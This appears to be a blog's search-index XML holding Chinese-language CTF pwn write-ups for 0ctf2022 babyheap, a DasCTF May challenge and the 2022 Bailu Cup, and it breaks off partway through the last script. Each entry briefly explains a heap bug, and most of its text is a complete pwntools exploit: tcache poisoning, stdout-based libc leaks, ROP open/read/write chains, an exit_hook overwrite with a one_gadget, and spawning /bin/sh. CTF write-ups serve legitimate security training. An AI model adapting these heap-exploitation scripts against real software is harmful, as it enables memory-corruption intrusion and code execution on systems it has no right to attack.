<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>0ctf2022-pwn</title>
    <url>/2022/09/30/0ctf2022-pwn/</url>
    <content><![CDATA[<p>0ctf2022部分pwn题复现</p>
<span id="more"></span>

<h1 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h1><p>编辑堆块内容时size输入负数可造成堆溢出。申请堆块大小没有限制，构造堆重叠可构造任意地址写，一开始想打<code>hous of cat</code>来着，后面发现好像不太行，然后打<code>environ</code>泄露栈地址也失败了，因为申请堆块的时候会整个置0导致无法泄露栈地址，后面经ex师傅提醒可以打<code>stdout</code>去泄露栈地址，然后orw即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">binary = <span class="string">&quot;./babyheap&quot;</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line">ip = <span class="string">&#x27;1.14.71.254&#x27;</span></span><br><span class="line">port = <span class="number">28834</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : io.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : io.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : io.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> text : io.recvuntil(text)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(io.recvuntil(<span class="string">b&quot;\xff&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> data : io.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (data, <span class="built_in">eval</span>(data)))</span><br><span class="line">ia = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">_flags = <span class="number">0xfbad1800</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">n</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Command: &#x27;</span>, <span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, con = <span class="string">b&#x27;a&#x27;</span></span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">b&#x27;Content: &#x27;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, con</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">b&#x27;Content: &#x27;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>)   <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x400</span>)  <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x10</span>)   <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>)   <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x20</span>)   <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x20</span>)   <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x10</span>)   <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x18</span> + p64(<span class="number">0x4b1</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x400</span>)  <span class="comment">#1</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">libcbase = uu64() - <span class="number">0x219ce0</span></span><br><span class="line">lg(<span class="string">&#x27;libcbase&#x27;</span>)</span><br><span class="line">set_context = libcbase + <span class="number">0x53a30</span> + <span class="number">61</span></span><br><span class="line">fd = libcbase + <span class="number">0x21a0d0</span></span><br><span class="line">stdout = libcbase + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">pop_rdi = libcbase + <span class="number">0x2a3e5</span></span><br><span class="line">pop_rsi = libcbase + <span class="number">0x2be51</span></span><br><span class="line">pop_rdx_r12 = libcbase + <span class="number">0x11f497</span></span><br><span class="line">ret = libcbase + <span class="number">0x29cd6</span></span><br><span class="line">pop_rax = libcbase + <span class="number">0x45eb0</span></span><br><span class="line">syscall = libcbase + <span class="number">0x91396</span></span><br><span class="line">open_addr = libcbase + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = libcbase + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = libcbase + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">environ = libcbase + <span class="number">0x221200</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>)   <span class="comment">#2 &amp; 7</span></span><br><span class="line">add(<span class="number">0x10</span>)   <span class="comment">#3 &amp; 8</span></span><br><span class="line">add(<span class="number">0x20</span>)   <span class="comment">#4 &amp; 9</span></span><br><span class="line">add(<span class="number">0x20</span>)   <span class="comment">#5 &amp; 10</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">ru(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">key = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heapbase = key &lt;&lt; <span class="number">12</span></span><br><span class="line">lg(<span class="string">&#x27;heapbase&#x27;</span>)</span><br><span class="line">lg(<span class="string">&#x27;key&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">8</span>, p64((stdout - <span class="number">0x20</span>) ^ key))</span><br><span class="line">payload = p64(_flags) + p64(<span class="number">0</span>) * <span class="number">3</span> + p64(environ) + p64(environ + <span class="number">8</span>) * <span class="number">2</span></span><br><span class="line">add(<span class="number">0x10</span>)   <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>)   <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x20</span> + payload)</span><br><span class="line">stack = uu64() - <span class="number">0x128</span></span><br><span class="line">lg(<span class="string">&#x27;stack&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">10</span>, p64(stack ^ key))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>)   <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x20</span>)   <span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">flag_addr = stack</span><br><span class="line">orw = <span class="string">b&#x27;flag&#x27;</span> + p32(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rax) + p64(<span class="number">2</span>) + p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(syscall) <span class="comment">#open(flag, 0)</span></span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(heapbase) + p64(pop_rdx_r12) + p64(<span class="number">0x30</span>) * <span class="number">2</span> + p64(read_addr)</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(write_addr)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>, orw)</span><br><span class="line">menu(<span class="number">5</span>)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<p><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304011138317.png" alt="image-20221002110948444"></p>
]]></content>
      <categories>
        <category>pwn</category>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>writeup</tag>
        <tag>0ctf2022</tag>
      </tags>
  </entry>
  <entry>
    <title>2022DasCTF-MAY-pwn</title>
    <url>/2022/06/20/2022DasCTF-MAY-pwn/</url>
    <content><![CDATA[<p>2022DASCTF MAY 出题人挑战赛部分pwn题复现</p>
<span id="more"></span>

<h1 id="山重水复"><a href="#山重水复" class="headerlink" title="山重水复"></a>山重水复</h1><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304011142202.jpg" alt="Xvy6AI.jpg"></p>
<p><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304011142750.jpg" alt="XvyR9f.jpg"></p>
<p>edit函数off by one</p>
<p><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304011143963.jpg" alt="Xvyhjg.jpg"></p>
<p>check函数把malloc_hook和free_hook禁掉了</p>
<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>程序没有show函数打印堆块内容，所以选择打stdout泄露libc，malloc_hook和free_hook被禁用，这里把exit_hook改成one_gadget</p>
<ul>
<li>先创建7个堆块</li>
<li>编辑堆块1利用off by one改写堆块2的size，使其与堆块3重叠，然后编辑堆块2把堆块3的size改成0x500</li>
<li>释放堆块3，5，4，此时堆块3包含了堆块4，5的区域</li>
<li>将堆块3原先size大小先申请出来，这样堆块3就变成了由堆块4的开头的chunk</li>
<li>再次申请一个小堆块即可得到有残留指针的堆块，并且该堆块和堆块4重叠，编辑该堆块即可将stdout链到tcache中</li>
<li>将stdout申请出来改flag字段和write_base字段即可泄露libc</li>
<li>再次用tcache attack申请到exit_hook填上one_gadget即可</li>
</ul>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">27193</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : io.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : io.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : io.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> text : io.recv(text)</span><br><span class="line">ru = <span class="keyword">lambda</span> text : io.recvuntil(text)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size</span>):</span><br><span class="line">    sla(<span class="string">b&quot;Your choice:&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;Idx:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&quot;Size:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    sla(<span class="string">b&quot;Your choice:&quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;Idx:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&quot;context:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&quot;Your choice:&quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;Idx:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0xb8</span>)</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x68</span>)</span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x68</span>)</span><br><span class="line">    add(<span class="number">3</span>, <span class="number">0x38</span>)</span><br><span class="line">    add(<span class="number">4</span>, <span class="number">0x38</span>)</span><br><span class="line">    add(<span class="number">5</span>, <span class="number">0x400</span>)</span><br><span class="line">    add(<span class="number">6</span>, <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">b&#x27;b&#x27;</span> * <span class="number">0xb8</span> + <span class="string">b&#x27;\xe1&#x27;</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0xd8</span>)</span><br><span class="line">    edit(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x68</span> + p64(<span class="number">0x501</span>))</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    delete(<span class="number">4</span>)</span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    add(<span class="number">4</span>, <span class="number">0x68</span>)</span><br><span class="line">    add(<span class="number">7</span>, <span class="number">0x10</span>)</span><br><span class="line">    edit(<span class="number">7</span>, <span class="string">b&#x27;\xa0\26&#x27;</span>)</span><br><span class="line">    add(<span class="number">3</span>, <span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">8</span>, <span class="number">0x38</span>)</span><br><span class="line">    edit(<span class="number">8</span>, p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">    libcbase = uu64() - libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br><span class="line">    exit_hook = libcbase + <span class="number">0x222f68</span></span><br><span class="line">    one = libcbase + <span class="number">0xe6c7e</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0xe6c7e execve(&quot;/bin/sh&quot;, r15, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe6c81 execve(&quot;/bin/sh&quot;, r15, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    0xe6c84 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x18</span>)</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x18</span>)</span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x18</span>)</span><br><span class="line">    add(<span class="number">3</span>, <span class="number">0x18</span>)</span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + <span class="string">b&#x27;\x41&#x27;</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x38</span>)</span><br><span class="line">    edit(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(<span class="number">0x21</span>) + p64(exit_hook))</span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x18</span>)</span><br><span class="line">    add(<span class="number">3</span>, <span class="number">0x18</span>)</span><br><span class="line">    edit(<span class="number">3</span>, p64(one))</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice:&#x27;</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    io.interactive()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pwn()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">        io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">27193</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>writeup</tag>
        <tag>DasCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2022柏鹭杯-pwn</title>
    <url>/2022/09/20/2022%E6%9F%8F%E9%B9%AD%E6%9D%AF-pwn/</url>
    <content><![CDATA[<p>2022柏鹭杯pwn题</p>
<span id="more"></span>

<h1 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h1><p><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100912175.PNG"></p>
<p>更新name的时候并没有将原先控制堆块对应的length字段更新。先申请大堆块，更新第一次把他释放掉并申请小堆块，再次更新name就能堆溢出了。堆溢出改掉func直接getshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">binary = <span class="string">&quot;./note1&quot;</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line">ip = <span class="string">&#x27;1.14.71.254&#x27;</span></span><br><span class="line">port = <span class="number">28834</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : io.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : io.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : io.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> text : io.recvuntil(text)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(io.recvuntil(<span class="string">b&quot;\xff&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> data : io.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (data, <span class="built_in">eval</span>(data)))</span><br><span class="line">ia = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">_flags = <span class="number">0xfbad1800</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">n</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size, func = <span class="number">2</span>, tag = <span class="string">b&#x27; &#x27;</span>, name = <span class="string">b&#x27;a&#x27;</span></span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, name)</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, tag)</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="built_in">str</span>(func))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_name</span>(<span class="params">idx, size, con = <span class="string">b&#x27;b&#x27;</span></span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;id: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_tag</span>(<span class="params">idx, tag</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;id: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    sa(<span class="string">b&#x27;: &#x27;</span>, tag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_func</span>(<span class="params">idx, func</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;id: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="built_in">str</span>(func))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">call</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x420</span>, tag = <span class="string">b&#x27; &#x27;</span>, name = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x420</span>)</span><br><span class="line"></span><br><span class="line">edit_tag(<span class="number">0</span>, p64(<span class="number">0xdeadbeefdeadbeef</span>))</span><br><span class="line">edit_func(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">call(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">b&#x27;\xef\xbe\xad\xde\xef\xbe\xad\xde&#x27;</span>)</span><br><span class="line">base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x131B</span></span><br><span class="line">lg(<span class="string">&#x27;base&#x27;</span>) </span><br><span class="line"></span><br><span class="line">edit_name(<span class="number">0</span>, <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x10</span>, tag = <span class="string">b&#x27; &#x27;</span>, name = <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit_name(<span class="number">0</span>, <span class="number">0x41f</span>, p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x31</span>) + p64(<span class="number">0</span>) + p64(base + <span class="number">0x131b</span>) + p64(base + elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(<span class="number">0x421</span>))</span><br><span class="line"></span><br><span class="line">call(<span class="number">1</span>)</span><br><span class="line">libcbase = uu64() - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;libcbase&#x27;</span>)</span><br><span class="line">sys_addr = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh = libcbase + libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line"></span><br><span class="line">edit_name(<span class="number">0</span>, <span class="number">0x41f</span>, p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x31</span>) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(sys_addr))</span><br><span class="line">call(<span class="number">1</span>)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<h1 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h1><p>uaf打house of banana</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">binary = <span class="string">&quot;./note2&quot;</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line">ip = <span class="string">&#x27;39.101.77.163&#x27;</span></span><br><span class="line">port = <span class="number">12032</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : io.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : io.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : io.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> text : io.recvuntil(text)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(io.recvuntil(<span class="string">b&quot;\xff&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> data : io.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (data, <span class="built_in">eval</span>(data)))</span><br><span class="line">ia = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">_flags = <span class="number">0xfbad1800</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">n</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title 